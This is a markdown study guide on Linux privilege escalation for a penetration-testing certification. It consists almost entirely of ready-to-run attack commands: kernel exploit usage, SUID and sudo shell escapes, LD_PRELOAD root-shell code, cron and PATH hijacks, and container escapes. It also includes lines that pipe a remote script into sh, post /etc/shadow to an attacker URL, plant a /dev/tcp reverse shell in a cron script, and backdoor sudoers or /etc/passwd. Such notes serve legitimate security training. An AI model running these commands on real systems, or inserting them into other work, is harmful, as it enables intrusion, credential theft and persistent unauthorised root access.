# Linux Privilege Escalation — Complete CPTS Guide

## Quick Win Checklist

- [ ] `sudo -l` — check sudo permissions ([[GTFOBins]])
- [x] `find / -perm -4000 -type f 2>/dev/null` — SUID binaries ([[GTFOBins]])
- [ ] `getcap -r / 2>/dev/null` — capabilities
- [ ] `cat /etc/crontab` — cron jobs
- [ ] `find / -writable -type d 2>/dev/null` — writable dirs
- [ ] `uname -a` — kernel version → kernel exploit?
- [ ] `netstat -tlnp` — listening services
- [ ] `ls -la /home/*/` — user files
- [ ] `cat /etc/fstab` — NFS shares
- [ ] `ps aux | grep root` — running as root
- [ ] `cat /etc/passwd | cut -d: -f1` — all users
- [ ] `cat ~/.bash_history` — history leakage
- [ ] Run [[LinPEAS]]
- [ ] Run [[pspy]]
- [ ] Run [[Linux-Exploit-Suggester]]

---

## 1. Initial Enumeration

### System Info

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
cat /etc/*release 2>/dev/null
cat /etc/issue
lscpu
free -h
df -h
```

### User Enumeration

```bash
sudo -l
cat /etc/passwd | cut -d: -f1
cat /etc/sudoers 2>/dev/null
ls -la /home/*/
ls -la /root/ 2>/dev/null
cat ~/.bash_history 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null
cat /var/mail/$USER 2>/dev/null
cat /var/spool/mail/$USER 2>/dev/null
```

### Process & Service Enumeration

```bash
ps aux
ps aux | grep root
ps -ef --forest
ps auxf
top -n 1 -b
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/* 2>/dev/null
cat /etc/cron.hourly/* 2>/dev/null
systemctl list-units --type=service --state=running
```

### Network Enumeration

```bash
ip addr
ip route
netstat -tlnp
netstat -anp
ss -tlnp
ss -anp
arp -a
```

### File & Directory Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
find / -perm -6000 -type f 2>/dev/null       # SUID + SGID
find / -writable -type d 2>/dev/null         # Writable dirs
find / -writable -type f 2>/dev/null         # Writable files
find / -type f -name "*.key" -o -name "*.pem" -o -name "*.crt" 2>/dev/null
find / -type f -name "*.conf" -o -name "*.config" 2>/dev/null
find / -type f -name "*.log" 2>/dev/null
ls -la /opt/
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/
```

### Credential Enumeration

```bash
cat /etc/passwd
cat /etc/shadow 2>/dev/null
cat /etc/fstab
cat /etc/exports 2>/dev/null
cat /etc/samba/smb.conf 2>/dev/null
cat /etc/ntp.conf 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
grep -ri "pass" /var/log/ 2>/dev/null
```

---

## 2. Automated Tools

### [[LinPEAS]]

```bash
# Transfer and run
curl -L http://<attacker-ip>/linpeas.sh | sh
wget http://<attacker-ip>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# Run locally
./linpeas.sh -a    # All checks
./linpeas.sh -s    # Superfast
./linpeas.sh -e    # Extra tests
```

### [[pspy]] — Process Monitor

```bash
# Monitor processes (useful for cron jobs)
./pspy64
./pspy64 -i 1000    # Interval in ms
./pspy64 -p 1000    # Process polling interval
```

### [[Linux-Exploit-Suggester]]

```bash
# Transfer
wget http://<attacker-ip>/les.sh -O /tmp/les.sh
chmod +x /tmp/les.sh && /tmp/les.sh

# Run locally
perl linux-exploit-suggester.pl
perl linux-exploit-suggester.pl --checksec
```

---

## 3. Kernel Exploits

### [[Dirty Pipe]] — CVE-2022-0847

**Kernel 5.8 — 5.16.11**

```bash
# Check kernel version
uname -r

# Exploit — overwrite /etc/passwd to create root user
gcc dirtypipe.c -o dirtypipe
./dirtypipe /etc/passwd "newroot:$(openssl passwd -1 password):0:0:root:/root:/bin/bash"

# Or add a user directly
echo "newuser:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" > /tmp/passwd
./dirtypipe /etc/passwd "$(cat /tmp/passwd)"
su newuser
```

### [[OverlayFS]] — CVE-2021-3493

**Kernel 5.11 — 5.13 (Ubuntu specific)**

```bash
# Check
uname -r

# Exploit
gcc exploit.c -o exploit
./exploit
```

### [[Dirty Cow]] — CVE-2016-5195

**Kernel < 4.8.3**

```bash
# Check
uname -r

# Exploit — overwrite a SUID binary or /etc/passwd
gcc -pthread dirtycow.c -o dirtycow
./dirtycow /usr/bin/passwd "$(cat payload)"
# Or use dirtycow to modify /etc/passwd directly
./dirtycow /etc/passwd "$(openssl passwd -1 password):0:0:root:/root:/bin/bash"
```

### Other Notable Kernel Exploits

| CVE | Name | Kernel Range | Notes |
|-----|------|-------------|-------|
| CVE-2017-16995 | eBPF | 4.4 — 4.13 | Ubuntu 16.04 |
| CVE-2017-1000112 | UDP Fragmentation | < 4.13 | |
| CVE-2022-0185 | Linux Kernel | < 5.16.2 | Container escape |
| CVE-2023-2640 | Ubuntu OverlayFS | Ubuntu | Similar to CVE-2021-3493 |
| CVE-2016-8655 | Race Condition | < 4.9 | |
| CVE-2014-0038 | perf_swevent | < 3.15 | |
| CVE-2012-0056 | memodiopen | 2.6.39 — 3.2.2 | /proc/pid/mem |

> **Note:** Always try [[Linux-Exploit-Suggester]] first — it maps kernel version to known CVEs.

---

## 4. SUID Exploitation

### Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null       # SUID + SGID
find / -perm -6000 -type f 2>/dev/null
find / -user root -perm -4000 -type f 2>/dev/null            # Root-owned SUID
find / -perm -u=s -type f 2>/dev/null 2>/dev/null
```

### [[GTFOBins]] — Common SUID Binaries

#### nmap (interactive mode)

```bash
nmap --interactive
nmap> !sh
# Or directly
nmap --script exploit.nse
```

#### find

```bash
find / -exec "/bin/sh" -p \;
/usr/bin/find . -exec /bin/sh -p \; -quit
```

#### vim / vi / nano / less / more

```bash
# vim
vim -c '!sh'
/usr/bin/vim.basic -c ':!/bin/sh'

# less
less /etc/passwd
!/bin/sh

# more
more /etc/passwd
!/bin/sh

# nano
nano
^R^X
reset; sh 1>&0 2>&0

# awk
awk 'BEGIN {system("/bin/sh")}'

# sed
sed -n '1e /bin/sh' /etc/passwd
```

#### bash

```bash
bash -p
/bin/sh -p       # -p preserves effective UID
```

#### python / python3 / perl / ruby

```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
```

#### cp / mv (overwrite shadow)

```bash
# If you can write to /etc/shadow via some other means
cp /etc/passwd /tmp/passwd.bak
# Generate a password hash
openssl passwd -1 password
echo "root:hash:0:0:root:/root:/bin/bash" > /tmp/passwd
cp /tmp/passwd /etc/passwd
```

#### strace / ltrace

```bash
strace -o /dev/null /bin/sh
ltrace /bin/sh
```

#### tcpdump

```bash
tcpdump -w /tmp/payload -z /bin/sh
# Triggers when capture file rotates
```

#### base64 (read files)

```bash
base64 /etc/shadow | base64 -d
```

#### xxd (read files)

```bash
xxd /etc/shadow
```

#### docker

```bash
docker run -v /:/mnt -it alpine chroot /mnt
```

#### chmod / chown (escalate via shadow)

```bash
chmod 777 /etc/shadow    # If SUID chmod
chown root:root /tmp/exploit    # Then set SUID
```

### SUID — Interesting Binaries to Check

```
aria2c, arp, ash, base32, base64, bash, busybox, capsh,
cat, chmod, chown, chroot, cobc, cp, csh, csplit, curl,
cut, dash, date, dd, dialog, diff, docker, ed, env, expand,
expect, find, flock, fmt, fold, gdb, gimp, grep, gtester,
hd, head, hexdump, highlight, iconv, install, ionice,
ipython, jjs, join, jq, jrunscript, ksh, ksshell, ldconfig,
less, logsave, look, lwp-download, lwp-request, make,
man, mawk, mc, minicom, more, mount, mtr, mv, nano,
nasm, ncat, neofetch, netcat, nice, nl, nmap, node,
nohup, od, openssl, pdb, perl, pg, php, pinfo, pr,
python, readelf, rev, rsync, run-parts, rvim, sar,
scp, script, sed, service, setarch, sftp, smbclient,
socat, sort, sqlite3, ssh, start-stop-daemon, stdbuf,
strace, strings, su, sysctl, systemctl, tac, tail,
tar, taskset, tclsh, tee, telnet, tftp, thttpd,
time, timeout, tmate, tmux, top, traceroute, tr,
unexpand, uniq, unshare, utee, vi, vim, wall, watch,
wc, wget, whois, xargs, xxd, xz, yash, zsh, zsoelim,
zsync
```

---

## 5. Sudo Exploitation

### Enumerate Sudo

```bash
sudo -l
sudo -l -l     # Enhanced
sudo --list    # Same as -l
```

### [[GTFOBins]] Sudo Exploitation

#### Commands allowed via sudo — general pattern

```bash
# Most interpreters/editors
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find / -exec /bin/sh \;
sudo less /etc/passwd → !/bin/sh
sudo more /etc/passwd → !/bin/sh
sudo vim -c '!sh'
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo nmap --interactive → !sh
sudo man man → !/bin/sh
sudo wget --post-file=/etc/shadow <attacker-url>
sudo curl --data @/etc/shadow <attacker-url>
sudo tcpdump -w /tmp/x -z /bin/sh
```

#### Environment Variable Exploitation

```bash
# LD_PRELOAD — if env_keep includes LD_PRELOAD
sudo -l
# Output: env_keep+=LD_PRELOAD
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=./shell.so <allowed-command>

# shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

#### Python/Python3 PATH Hijack

```bash
# If sudo allows python with env_keep+=PYTHONPATH
sudo PYTHONPATH=/tmp python -c "import malicious"
```

---

## 6. Cron Jobs

### Enumerate Cron

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/* 2>/dev/null
```

### Writable Cron Script

```bash
# Check if any cron script is writable
ls -la /etc/cron*
find /etc/cron* -writable -type f 2>/dev/null

# Add reverse shell
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /path/to/cron/script
# Or add SUID
echo "chmod +s /bin/bash" >> /path/to/cron/script
```

### Wildcard Injection in Cron

```bash
# If cron runs: tar czf /backup/backup.tar.gz /var/www/*
cd /var/www
echo 'echo "student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
tar cf /dev/null --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

### PATH Hijacking in Cron

```bash
# If cron runs a command without full path, e.g. "tar czf ..."
# Check if PATH is defined in crontab
cat /etc/crontab
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Create a malicious binary in a writable directory in the PATH
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /home/user/tar.c
gcc -o /home/user/tar /home/user/tar.c
chmod +x /home/user/tar
```

---

## 7. Linux Capabilities

### Enumerate Capabilities

```bash
getcap -r / 2>/dev/null
getcap /usr/bin/*
getcap /bin/*
filecap -a 2>/dev/null    # If libcap-ng-utils installed
```

### Dangerous Capabilities

| Capability | Effect | Exploitation |
|-----------|--------|-------------|
| `cap_setuid+ep` | Set user ID | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `cap_setgid+ep` | Set group ID | `python -c 'import os; os.setgid(0); os.system("/bin/sh")'` |
| `cap_dac_read_search+ep` | Bypass file read checks | Read any file |
| `cap_dac_override+ep` | Bypass file r/w checks | Overwrite shadow |
| `cap_chown+ep` | Change file owner | `chown root:root /path/to/file` |
| `cap_fowner+ep` | Change file owner (any) | `chown root:root /tmp/payload` |
| `cap_kill+ep` | Send signals | Kill processes |
| `cap_net_raw+ep` | Raw sockets | Sniff traffic |
| `cap_net_admin+ep` | Network admin | Interface config |
| `cap_sys_admin+ep` | System admin | Mount, nsenter |
| `cap_sys_ptrace+ep` | Ptrace any process | Inject into root process |
| `cap_sys_module+ep` | Insert kernel modules | `insmod rootkit.ko` |
| `cap_sys_rawio+ep` | Raw I/O | Read/write memory |
| `cap_net_bind_service+ep` | Bind to any port | |

### Exploitation Examples

```bash
# cap_setuid+ep on python/python3
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_read_search+ep on any binary
# Use binary to read /etc/shadow
./binary /etc/shadow

# cap_dac_override+ep on cp
cp /dev/null /etc/shadow     # Wipe shadow
# Or overwrite passwd
echo "root:hash:0:0:root:/root:/bin/bash" > /etc/passwd

# cap_chown+ep on chown
chown root:root /tmp/suid_binary
chmod +s /tmp/suid_binary

# cap_sys_admin+ep on mount
mkdir /tmp/mnt
mount -t cgroup -o memory cgroup /tmp/mnt
mkdir /tmp/mnt/x
echo 1 > /tmp/mnt/x/notify_on_release
echo "$(cat /tmp/mnt/release_agent)" > /tmp/mnt/release_agent
# Then trigger release_agent for root shell
```

---

## 8. PATH Hijacking

### Enumerate PATH

```bash
echo $PATH
echo $PATH | tr ':' '\n'
```

### Technique

```bash
# Find a script/binary run without full path
cat /usr/local/bin/admin_script
# Contains: system("ls -la") or just "ls"

# If current dir (.) is in PATH or we can prepend
echo '#!/bin/bash' > /tmp/ls
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
./admin_script
/tmp/bash -p
```

### PATH Hijacking with Functions

```bash
# If we can export a function
ls() {
    /bin/cp /bin/bash /tmp/bash
    /bin/chmod +s /tmp/bash
    /bin/ls "$@"
}
export -f ls
```

---

## 9. NFS Root Squashing

### Enumerate NFS

```bash
cat /etc/exports
showmount -e <target-ip>
```

### Check for `no_root_squash`

```bash
# On target
cat /etc/exports
# If output includes: /share <ip>(rw,no_root_squash)
```

### Exploit (From Attacker Machine)

```bash
# As root on attacker
mkdir /tmp/nfsmount
mount -t nfs <target-ip>:/share /tmp/nfsmount
cd /tmp/nfsmount

# Create SUID binary as root (your UID is 0)
cp /bin/bash .
chmod +s bash
chown root:root bash

# On target — run the SUID bash
cd /share
./bash -p
```

---

## 10. Docker/LXC Escape

### Check if in Docker

```bash
cat /proc/1/cgroup | grep -i docker
cat /proc/1/cgroup | grep -i lxc
cat /proc/1/sched | head -1
ls -la /.dockerenv 2>/dev/null
```

### Docker Socket Mount

```bash
# Check for docker socket
ls -la /var/run/docker.sock 2>/dev/null

# If mounted, run with Docker CLI
docker run -v /:/mnt -it alpine chroot /mnt

# If docker binary not present, get it
wget https://<attacker>/docker -O /tmp/docker
chmod +x /tmp/docker
/tmp/docker run -v /:/mnt -it alpine chroot /mnt
```

### Docker Capabilities — `--privileged`

```bash
# If running with --privileged
fdisk -l                   # List disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Or use nsenter
nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash
```

### LXC/LXD Escape

```bash
# Check if LXC/LXD
cat /proc/1/cgroup | grep lxc
# Try nsenter
nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash
```

---

## 11. LXD Group

### Check LXD Group Membership

```bash
id
groups
# If user is in lxd group
```

### Exploit

```bash
# On attacker: create a privileged container image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine
# Transfer the .tar.gz to target

# On target
lxc image import alpine-*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer device disk source=/ path=/mnt/root
lxc start mycontainer
lxc exec mycontainer /bin/sh
ls -la /mnt/root/
cat /mnt/root/etc/shadow
```

---

## 12. tmux / screen Session Hijacking

### tmux

```bash
# Check for tmux sockets
find / -name "tmux*" -type s 2>/dev/null
ls -la /tmp/tmux-*/
ls -la /var/run/screen/

# Check tmux processes
ps aux | grep tmux

# Attach to a session
tmux -S /tmp/tmux-<uid>/default attach
tmux attach -t <session-name>

# Create a new session as the other user
tmux -S /tmp/tmux-<uid>/default new-session
```

### screen

```bash
# List screen sessions
screen -ls
ps aux | grep screen
find / -name "screen*" -type s 2>/dev/null

# Check writable sockets
ls -la /var/run/screen/

# Attach to screen session
screen -x <user>/<session>

# If no perms, check for readable sockets
# May need to set SUID on screen binary if owned by root and writable
```

---

## 13. Additional Techniques

### Writable /etc/passwd

```bash
ls -la /etc/passwd
# If writable, add root user
echo "newroot:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
su newroot
```

### Writable /etc/shadow

```bash
ls -la /etc/shadow
# If writable, change root password
openssl passwd -1 password
# Replace root's hash with new hash
# Then: su root
```

### Writable /etc/sudoers

```bash
ls -la /etc/sudoers
echo "$USER ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo su
```

### MySQL / MariaDB as Root

```bash
# If MySQL running as root
mysql -u root
SELECT sys_exec('cp /bin/bash /tmp/bash; chmod +s /tmp/bash');
\! cp /bin/bash /tmp/bash
\! chmod +s /tmp/bash
```

### pspy for Silent Cron Jobs

```bash
# Run pspy for a few minutes to catch hidden cron jobs
./pspy64
# Look for commands run as root
```

### Shared Libraries (LD_PRELOAD / LD_LIBRARY_PATH)

```bash
# Check env_keep in sudoers
sudo -l
# If env_keep+=LD_LIBRARY_PATH

# Create malicious library
gcc -fPIC -shared -o libexploit.so exploit.c
sudo LD_LIBRARY_PATH=. <binary>

# Or with LD_PRELOAD on a setuid binary
# If the SUID binary doesn't ignore LD_PRELOAD (rare)
LD_PRELOAD=./malicious.so ./suid-binary
```

### Password Spraying After Enumeration

```bash
# Check common password files
cat /etc/passwd | cut -d: -f1 | while read user; do
    echo "$user:password123" >> creds.txt
    echo "$user:admin123" >> creds.txt
    echo "$user:123456" >> creds.txt
    echo "$user:$(echo $user)123" >> creds.txt
done

# Test with su
while IFS=: read -r user pass; do
    echo "$pass" | su "$user" -c "id" 2>/dev/null && echo "VALID: $user:$pass"
done < creds.txt
```

---

## 14. Mounted Filesystems

### Enumerate

```bash
mount
df -h
cat /etc/fstab
findmnt
lsblk
```

### Exploit Mounted File Systems

```bash
# Check if a filesystem is mounted with noexec, nosuid, nodev
mount | grep "/tmp"

# If /tmp is noexec, use /dev/shm or /var/tmp
ls -la /dev/shm
ls -la /var/tmp
```

---

## 15. Logrotate Exploitation

```bash
# Check logrotate config
cat /etc/logrotate.conf
cat /etc/logrotate.d/*

# If a logrotate script runs as root and a user can write to the log file
# Use logrotten tool
./logrotten -p payload <logfile>
```

---

## 16. tmux/screen — Process Injection via ptrace

### Check for ptrace capabilities

```bash
# cap_sys_ptrace
getcap -r / 2>/dev/null | grep ptrace
# Or running as root
```

### Inject into root process

```bash
# Using gdb
gdb -p <root-pid>
(gdb) call system("bash -c 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'")
(gdb) quit
/tmp/bash -p
```

---

## 17. Special File Permissions

### .rhosts / .shosts

```bash
find / -name "*.rhosts" -o -name "*.shosts" 2>/dev/null
# If writable, add:
# + +
# Then rsh from attacker
```

### .ssh/authorized_keys

```bash
ls -la ~/.ssh/
# If writable, add attacker's public key
echo "<attacker-pub-key>" >> ~/.ssh/authorized_keys
```

---

## Quick Reference — Command Cheat Sheet

| Goal | Command |
|------|---------|
| Find SUID | `find / -perm -4000 -type f 2>/dev/null` |
| Find SGID | `find / -perm -2000 -type f 2>/dev/null` |
| Find capabilities | `getcap -r / 2>/dev/null` |
| Check sudo | `sudo -l` |
| Check cron | `cat /etc/crontab` |
| Kernel version | `uname -a` |
| Writable files | `find / -writable -type f 2>/dev/null` |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| NFS exports | `cat /etc/exports` |
| Listening ports | `netstat -tlnp` or `ss -tlnp` |
| Running processes | `ps aux` |
| All users | `cat /etc/passwd` |
| wget file | `wget <url> -O /tmp/out` |
| curl file | `curl <url> -o /tmp/out` |
| linpeas | `curl -L <ip>/linpeas.sh \| sh` |
| pspy | Download and run `./pspy64` |
| LES | Download and run `perl les.pl` |
| Python shell | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| History | `cat ~/.bash_history /root/.bash_history 2>/dev/null` |
| Search passwords | `grep -ri "password" /home/ /var/www/ /opt/ 2>/dev/null` |
| Search configs | `find / -type f \( -name "*.conf" -o -name "*.config" \) 2>/dev/null` |
| Search keys | `find / -type f \( -name "*.key" -o -name "*.pem" \) 2>/dev/null` |
| Check mount | `mount \| grep -E "noexec|nosuid"` |
| Check docker | `ls -la /var/run/docker.sock` or `cat /proc/1/cgroup \| grep docker` |
| Env variables | `env \| grep -i pass` |

---

## References

- [[GTFOBins]]
- [[LinPEAS]]
- [[pspy]]
- [[Linux-Exploit-Suggester]]
- [[Dirty Pipe]]
- [[Dirty Cow]]
- [[OverlayFS]]
- [[LXD Privesc]]
- [[NFS Privesc]]
